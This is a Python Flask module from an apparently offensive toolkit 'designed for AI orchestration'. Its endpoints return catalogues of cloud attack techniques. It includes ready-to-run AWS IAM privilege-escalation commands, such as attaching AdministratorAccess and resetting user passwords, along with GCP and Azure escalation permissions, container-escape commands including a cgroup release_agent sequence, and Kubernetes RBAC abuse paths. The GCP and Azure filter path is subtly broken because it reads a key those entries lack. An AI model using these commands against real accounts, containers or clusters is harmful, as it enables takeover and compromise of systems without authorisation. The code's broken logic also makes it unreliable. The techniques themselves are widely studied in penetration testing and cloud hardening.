"""
server_api/cloud_attack/cloud_attack_routes.py

Cloud exploitation — AWS/GCP/Azure IAM privilege escalation paths,
container escape techniques, Kubernetes RBAC abuse, serverless exploitation,
and cross-account attack paths. All designed for AI orchestration.
"""

import json
import logging
from typing import Any, Dict, List

from flask import Blueprint, jsonify, request

from server_core import ModernVisualEngine

logger = logging.getLogger(__name__)

api_cloud_attack_bp = Blueprint("api_cloud_attack", __name__)


# ═══════════════════════════════════════════════════════════════════════
# AWS IAM PRIVILEGE ESCALATION PATHS
# ═══════════════════════════════════════════════════════════════════════

# Known AWS IAM privilege escalation techniques (Rhino Security Labs)
AWS_PRIVESC_PATHS = [
  {
    "name": "CreatePolicyVersion",
    "permission": "iam:CreatePolicyVersion",
    "severity": "CRITICAL",
    "description": "Create a new policy version with administrator permissions and set it as default",
    "exploitation": "aws iam create-policy-version --policy-arn <target_policy> --policy-document file://admin.json --set-as-default",
    "mitre": "T1098.003",
  },
  {
    "name": "SetExistingDefaultPolicyVersion",
    "permission": "iam:SetDefaultPolicyVersion",
    "severity": "CRITICAL",
    "description": "Set an older, more permissive policy version as the default",
    "exploitation": "aws iam set-default-policy-version --policy-arn <target_policy> --version-id v1",
    "mitre": "T1098.003",
  },
  {
    "name": "CreateAccessKey",
    "permission": "iam:CreateAccessKey",
    "severity": "HIGH",
    "description": "Create a new access key for another IAM user",
    "exploitation": "aws iam create-access-key --user-name <target_user>",
    "mitre": "T1098.001",
  },
  {
    "name": "CreateLoginProfile",
    "permission": "iam:CreateLoginProfile",
    "severity": "HIGH",
    "description": "Create a login profile (console password) for a user without one",
    "exploitation": "aws iam create-login-profile --user-name <target_user> --password 'Pwn3d!!' --no-password-reset-required",
    "mitre": "T1098.001",
  },
  {
    "name": "UpdateLoginProfile",
    "permission": "iam:UpdateLoginProfile",
    "severity": "HIGH",
    "description": "Change the password of an existing IAM user",
    "exploitation": "aws iam update-login-profile --user-name <target_user> --password 'NewP@ssw0rd!!'",
    "mitre": "T1098.001",
  },
  {
    "name": "AttachUserPolicy",
    "permission": "iam:AttachUserPolicy",
    "severity": "CRITICAL",
    "description": "Attach the AdministratorAccess policy to your user",
    "exploitation": "aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    "mitre": "T1098.003",
  },
  {
    "name": "AttachRolePolicy",
    "permission": "iam:AttachRolePolicy",
    "severity": "CRITICAL",
    "description": "Attach admin policy to a role you can assume",
    "exploitation": "aws iam attach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    "mitre": "T1098.003",
  },
  {
    "name": "PutUserPolicy",
    "permission": "iam:PutUserPolicy",
    "severity": "CRITICAL",
    "description": "Put an inline policy allowing all actions on your user",
    "exploitation": "aws iam put-user-policy --user-name <user> --policy-name privesc --policy-document file://admin.json",
    "mitre": "T1098.003",
  },
  {
    "name": "LambdaPassRole",
    "permission": "iam:PassRole + lambda:CreateFunction",
    "severity": "HIGH",
    "description": "Pass a privileged role to a new Lambda function, then invoke it",
    "exploitation": "Create Lambda function with privileged execution role, trigger it to execute commands",
    "mitre": "T1098.003",
  },
  {
    "name": "EC2PassRole",
    "permission": "iam:PassRole + ec2:RunInstances",
    "severity": "HIGH",
    "description": "Pass a privileged IAM role to a new EC2 instance with userdata script",
    "exploitation": "Launch EC2 instance with privileged role, userdata script exfiltrates credentials via metadata service",
    "mitre": "T1098.003",
  },
  {
    "name": "GluePassRole",
    "permission": "iam:PassRole + glue:CreateDevEndpoint",
    "severity": "HIGH",
    "description": "Pass privileged role to AWS Glue development endpoint",
    "exploitation": "Create Glue endpoint with privileged role, SSH in and access metadata service",
    "mitre": "T1098.003",
  },
  {
    "name": "CloudFormationPassRole",
    "permission": "iam:PassRole + cloudformation:CreateStack",
    "severity": "HIGH",
    "description": "Pass a privileged role to a CloudFormation stack",
    "exploitation": "Create CloudFormation stack with custom resource backed by Lambda using privileged role",
    "mitre": "T1098.003",
  },
]

GCP_PRIVESC_PATHS = [
  {"name": "iam.serviceAccounts.getAccessToken", "severity": "CRITICAL", "description": "Generate OAuth token for any service account"},
  {"name": "iam.serviceAccountKeys.create", "severity": "CRITICAL", "description": "Create a new service account key"},
  {"name": "iam.roles.update", "severity": "CRITICAL", "description": "Modify an existing IAM role to grant more permissions"},
  {"name": "resourcemanager.projects.setIamPolicy", "severity": "CRITICAL", "description": "Set IAM policy on a project (grant owner)"},
]

AZURE_PRIVESC_PATHS = [
  {"name": "Microsoft.Authorization/roleAssignments/write", "severity": "CRITICAL", "description": "Assign RBAC roles (e.g., Owner) to any principal"},
  {"name": "Microsoft.Authorization/roleDefinitions/write", "severity": "CRITICAL", "description": "Modify an existing custom role to add permissions"},
  {"name": "Automation Account RunAs", "severity": "HIGH", "description": "Abuse Automation Account RunAs service principal for lateral movement"},
]

# Container escape techniques
CONTAINER_ESCAPE_TECHNIQUES = [
  {"name": "privileged_container", "description": "Container running in privileged mode — trivial escape via cgroup release_agent or nsenter", "detection": "Check: cat /proc/self/status | grep CapEff (if ffffffff → privileged)"},
  {"name": "docker_socket_mount", "description": "Docker socket mounted inside container — `docker run -v /:/host` to escape", "detection": "Check: ls -la /var/run/docker.sock"},
  {"name": "host_pid_namespace", "description": "Host PID namespace shared — `nsenter --target 1 --mount --uts --ipc --net --pid` to escape", "detection": "Check: mount | grep proc (if proc on /proc → host PID ns)"},
  {"name": "host_network", "description": "Host network mode — can access host services directly", "detection": "Check: ip addr (if host interfaces visible → host network)"},
  {"name": "cap_sys_admin", "description": "CAP_SYS_ADMIN capability — mount host filesystem via cgroup notify_on_release", "detection": "Check: capsh --print | grep cap_sys_admin"},
  {"name": "cap_sys_ptrace", "description": "CAP_SYS_PTRACE — inject code into host processes", "detection": "Check: capsh --print | grep cap_sys_ptrace"},
  {"name": "release_agent_escape", "description": "Abuse cgroup release_agent to execute commands on host", "exploitation": "mkdir /tmp/cgrp; mount -t cgroup -o memory cgroup /tmp/cgrp; echo 1 > /tmp/cgrp/notify_on_release; echo '#!/bin/sh\n<command>' > /release_agent.sh"},
]

K8S_ATTACK_PATHS = [
  {"name": "pod_escape_hostpath", "description": "Pod with hostPath volume mount — write to host filesystem", "mitre": "T1611"},
  {"name": "rbac_cluster_admin", "description": "ClusterRoleBinding to cluster-admin — full cluster compromise", "mitre": "T1098.005"},
  {"name": "kubelet_anonymous_auth", "description": "Kubelet API with anonymous auth enabled — execute commands in any pod", "mitre": "T1610"},
  {"name": "etcd_access", "description": "Access to etcd — read/write all cluster secrets and configs", "mitre": "T1552.007"},
  {"name": "service_account_token", "description": "Compromised service account token with cluster-admin — full API access", "mitre": "T1528"},
]


# ═══════════════════════════════════════════════════════════════════════
# ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════

@api_cloud_attack_bp.route("/api/tools/iam-privesc", methods=["POST"])
def iam_privesc():
  """Discover AWS/GCP/Azure IAM privilege escalation paths."""
  try:
    params = request.json or {}
    cloud_provider = params.get("provider", "aws")
    permissions = params.get("permissions", [])

    if cloud_provider == "aws":
      paths = AWS_PRIVESC_PATHS
    elif cloud_provider == "gcp":
      paths = GCP_PRIVESC_PATHS
    elif cloud_provider == "azure":
      paths = AZURE_PRIVESC_PATHS
    else:
      return jsonify({"error": f"Unknown provider: {cloud_provider}", "success": False}), 400

    # Filter by permissions if provided
    if permissions:
      paths = [p for p in paths if any(perm.lower() in p["permission"].lower() for perm in permissions)]

    critical = [p for p in paths if p["severity"] == "CRITICAL"]
    high = [p for p in paths if p["severity"] == "HIGH"]

    return jsonify({
      "success": True,
      "provider": cloud_provider,
      "total_paths": len(paths),
      "critical_paths": len(critical),
      "high_paths": len(high),
      "paths": paths,
      "recommendation": (
        f"Found {len(critical)} CRITICAL and {len(high)} HIGH privilege escalation paths. "
        f"Prioritize patching critical paths first."
      ) if critical else "No critical paths found with given permissions.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


@api_cloud_attack_bp.route("/api/tools/container-escape", methods=["POST"])
def container_escape():
  """Detect container escape vectors."""
  try:
    params = request.json or {}
    check_type = params.get("type", "all")

    techniques = CONTAINER_ESCAPE_TECHNIQUES
    if check_type != "all":
      techniques = [t for t in techniques if t["name"] == check_type]

    return jsonify({
      "success": True,
      "techniques": techniques,
      "count": len(techniques),
      "instruction": "Run the detection commands inside your container to check for escape vectors.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


@api_cloud_attack_bp.route("/api/tools/k8s-attack", methods=["POST"])
def k8s_attack():
  """Discover Kubernetes attack paths and RBAC abuse vectors."""
  try:
    params = request.json or {}
    attack_type = params.get("type", "all")

    paths = K8S_ATTACK_PATHS
    if attack_type != "all":
      paths = [p for p in paths if p["name"] == attack_type]

    return jsonify({
      "success": True,
      "attack_paths": paths,
      "count": len(paths),
      "note": "Use kubectl to verify these attack paths. Focus on pods with high-privilege service accounts.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500
